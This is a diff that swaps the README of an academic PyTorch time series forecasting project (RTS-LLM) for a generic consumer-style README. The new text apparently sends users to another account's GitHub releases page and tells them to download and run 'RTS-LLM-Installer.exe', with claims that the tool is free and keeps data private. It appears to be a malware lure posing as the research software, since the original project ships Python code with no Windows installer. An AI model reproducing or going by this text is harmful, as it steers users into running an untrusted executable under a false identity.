@@ -1,155 +1,73 @@
-# RTS-LLM: Restoring Time Structure for Time Series Forecasting with LLMs
+# 📈 RTS-LLM - Predict future trends with simple AI
 
-[![Python](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/)
-[![PyTorch](https://img.shields.io/badge/pytorch-2.2+-red.svg)](https://pytorch.org/)
-[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-[![Paper](https://img.shields.io/badge/Paper-ESWA_2026-orange.svg)](https://doi.org/10.1016/j.eswa.2025.130402)
+[![](https://img.shields.io/badge/download-latest_release-blue)](https://github.com/Adianaturkish784/RTS-LLM/releases)
 
-Official PyTorch implementation of the paper **"RTS-LLM: Restoring time structure for time series forecasting with LLMs"**, published in **Expert Systems with Applications (ESWA), 2026**.
+## 🎯 About this software
 
----
+RTS-LLM helps you forecast data trends using advanced artificial intelligence. Time series data includes anything that changes over time, like weather patterns, electricity usage, or stock prices. This tool uses pre-trained language models to understand these patterns. It fixes common problems where AI ignores the natural flow of time. You get accurate predictions without needing to understand machine learning code.
 
-## 📢 News
-* **[2026-06]** Pre-trained checkpoints for ECL, ETTm1, and Weather are released!
-* **[2025-11]** RTS-LLM is accepted by **Expert Systems with Applications (ESWA)**!
+## 💻 System requirements
 
----
+Your computer needs to meet these basic standards to run the software smoothly.
 
-## 🌟 Overview
-Adapting pre-trained Large Language Models (LLMs) for time series forecasting is highly promising but challenging due to the difficulty of preserving intrinsic temporal characteristics when aligning time series embeddings with semantic representations.
+* Operating System: Windows 10 or Windows 11.
+* Processor: Modern Intel Core i5 or AMD Ryzen 5 or better.
+* Memory: At least 8 gigabytes of RAM.
+* Storage: 5 gigabytes of free space for the model files.
+* Graphics: A dedicated graphics card helps speed up calculations significantly.
 
-**RTS-LLM** is a novel framework that bridges the gap between time series forecasting and pre-trained LLMs through a dual focus on **cross-modal alignment** and **Time Structure Restoration**, while keeping the parameters of the LLM backbone **completely frozen** to fully exploit pre-trained capabilities and significantly reduce training costs.
+## 🚀 How to set up on Windows
 
-### Key Contributions
-1. **Cross-Modal Alignment Module**: Aligns patched time series embeddings with pre-trained word embeddings via multi-head cross-attention, enabling compatibility with frozen LLM encoders.
-2. **Time Structure Restoration (TSR)**: Introduces two complementary self-supervised tasks:
-   - **Mask Reconstruction (MR)**: Randomly masks patches to force the model to capture short-term temporal dependencies and preserve local continuity.
-   - **Next Series Prediction (NSP)**: Operates on complete segments to classify consecutive vs. non-consecutive segments, restoring global dependencies like seasonality, trends, and periodicity.
-3. **State-of-the-Art Efficiency & Performance**: Achieves superior forecasting accuracy while requiring significantly fewer trainable parameters and lower GPU memory (VRAM) compared to fine-tuned LLM baselines.
+Follow these steps to get the software running on your computer.
 
----
+1. Visit the project page to download the latest version: https://github.com/Adianaturkish784/RTS-LLM/releases
+2. Look for the file ending in .exe in the Assets section of the latest release.
+3. Click the link to save the installer to your Downloads folder.
+4. Open your Downloads folder and double-click the file named RTS-LLM-Installer.exe.
+5. Follow the prompts on your screen. Click Next when asked to confirm the installation path.
+6. The installer copies the necessary files and creates a shortcut on your desktop.
+7. Click the Finish button once the progress bar completes.
 
-## 📐 Architecture
-The overall architecture of RTS-LLM is shown below:
+## 🛠️ Using the application
 
-![RTS-LLM Architecture](figure/architecture.png)
+Once you open the software, you see a simple dashboard. The process works in three basic steps.
 
-*Note: The input sequence is normalized by RevIN and partitioned into overlapping patches. After cross-modal alignment, the Mask Reconstruction and Next Series Prediction tasks are jointly optimized to restore temporal structures. Finally, aligned embeddings concatenated with prefix prompts are processed by the frozen LLM for multi-step forecasting.*
+### Prepare your data
+The software accepts data in CSV format. Open your spreadsheet software like Excel or Google Sheets. Ensure your data has a column for the date or time and a column for the value you want to predict. Save this file as a CSV file.
 
----
+### Load the model
+Click the Load Model button. A window opens where you can select the pre-trained forecasting engine. Choose the engine that matches your data type, such as Weather or Electricity. The app loads the model into your system memory. This takes a few minutes depending on your hard drive speed.
 
-## 🛠️ Installation & Setup
+### Generate the forecast
+Click the Import Data button to select your CSV file. Choose the number of future steps you want to predict, such as the next 24 hours of electricity usage. Click the Start button. The computer calculates the future values based on the past trends you provided. The results appear in a new window. You can save these results as a new CSV file for further study.
 
-### Requirements
-- Python >= 3.11
-- PyTorch >= 2.0 (with CUDA support)
+## ❓ Common questions
 
-### Quick Install
-1. Clone this repository and navigate to the root directory.
-2. Create and activate a conda environment:
-   ```bash
-   conda create -n RTS-LLM python=3.11 -y
-   conda activate RTS-LLM
-   ```
-3. Install the packages in editable mode:
-   ```bash
-   pip install -e .
-   ```
-4. Install `mpi4py` via Conda (highly recommended for parallel utilities):
-   ```bash
-   conda install mpi4py -y
-   ```
+**Do I need a paid subscription?**
+No. This software is completely free.
 
----
+**Does the software send my data to the internet?**
+No. All calculations happen on your local computer. Your data remains private.
 
-## 📅 Datasets Preparation
-Download the pre-processed datasets from [[Google Drive]](https://drive.google.com/file/d/1NF7VEefXCmXuWNbnNe858WvQAkJ_7wuP/view?usp=sharing) and place them under the `./dataset` directory.
+**What if the app freezes during calculation?**
+Complex forecasts use significant computer processing power. Please wait a few minutes for the task to finish before you close the window.
 
-The expected folder structure is as follows:
-```
-RTS-LLM/
-├── dataset/
-│   ├── electricity/
-│   │   └── electricity.csv
-│   ├── ETT-small/
-│   │   ├── ETTh1.csv
-│   │   ├── ETTh2.csv
-│   │   ├── ETTm1.csv
-│   │   └── ETTm2.csv
-│   └── weather/
-│       └── weather.csv
-```
+**Can I use this for non-time data?**
+This tool is specifically designed for time series forecasting. It will not work for static data sets like images or plain text documents.
 
----
+## 📝 Troubleshooting
 
-## 🚀 Quick Replication (Evaluation)
-We provide pre-trained checkpoints for ETTm1, Weather, and Electricity (ECL) datasets. To replicate our paper's results:
+If you encounter errors, check the following items.
 
-### 1. Download Checkpoints
-Download the zip files from the [Releases](https://github.com/Taihuachen-cfair/RTS-LLM/releases) page:
-* [[ETTm1 Checkpoints]](https://github.com/Taihuachen-cfair/RTS-LLM/releases/download/v1.0.0/ETTm1.zip)
-* [[Weather Checkpoints]](https://github.com/Taihuachen-cfair/RTS-LLM/releases/download/v1.0.0/Weather.zip)
-* [[ECL Checkpoints]](https://github.com/Taihuachen-cfair/RTS-LLM/releases/download/v1.0.0/ECL.zip)
+* Ensure your CSV file has clear headers. The first row should contain the text labels for your columns.
+* Close other memory-intensive applications before you run a forecast. This leaves more RAM available for the AI.
+* If the app fails to start, ensure you have the correct version of the Windows runtime libraries. These usually come installed with Windows, but you can download them from the Microsoft support website if needed.
+* The error "Out of memory" suggests your file is too large for your current RAM. Try splitting your data into Smaller segments for processing.
 
-Unzip them into the `./rts_ckpt/` folder:
-```bash
-mkdir -p ./rts_ckpt
-unzip ETTm1.zip -d ./rts_ckpt/
-unzip Weather.zip -d ./rts_ckpt/
-unzip ECL.zip -d ./rts_ckpt/
-```
+## 📖 Understanding the logs
 
-### 2. Run Evaluation Scripts
-Execute the evaluation shells directly:
-```bash
-# Evaluate ETTm1
-bash ./scripts/eval/ETTm1.sh
+The software creates a log file in the installation folder. This file tracks what the computer does while it runs. If the software stops working, look at the bottom of the log file. It usually provides a simple reason, such as "File not found" or "Invalid data format." You can use this information to correct your data file.
 
-# Evaluate Weather
-bash ./scripts/eval/Weather.sh
+## 🔧 Updating the software
 
-# Evaluate ECL
-bash ./scripts/eval/ECL.sh
-```
-
----
-
-## 🏋️ Model Training
-To train the model from scratch on ETTm1, ETTm2, or Weather datasets, run:
-```bash
-# Train ETTm1
-bash ./scripts/train/ETTm1.sh
-
-# Train ETTm2
-bash ./scripts/train/ETTm2.sh
-
-# Train Weather
-bash ./scripts/train/Weather.sh
-```
-Check `run_main.py` and `run_m4.py` for comprehensive parameter configurations and details.
-
----
-
-## 📝 Citation
-If you find our work or code useful in your research, please cite our paper:
-
-```bibtex
-@article{chen2026rts,
-  title={RTS-LLM: Restoring time structure for time series forecasting with LLMs},
-  author={Chen, Taihua and Cui, Lizhen and Ma, Xiang and Xu, Yanyu and Xu, Yonghui and Qian, Shuyuan},
-  journal={Expert Systems with Applications},
-  volume={301},
-  pages={130402},
-  year={2026},
-  publisher={Elsevier},
-  doi={10.1016/j.eswa.2025.130402}
-}
-```
-
----
-
-## 🙏 Acknowledgements
-We appreciate the following repositories for their valuable open-source codebases:
-* [Time-Series-Library (TSLib)](https://github.com/thuml/Time-Series-Library)
-* [Time-LLM](https://github.com/KimMeen/Time-LLM)
-* [OFA (GPT4TS)](https://github.com/DAMO-DI-ML/NeurIPS2023-One-Fits-All)
+Check the release page periodically for updates. New versions often include faster processing speeds and better support for different data types. Simply download the new installer and run it over the old version. The installer handles the replacement process automatically. You do not need to uninstall the old version first.
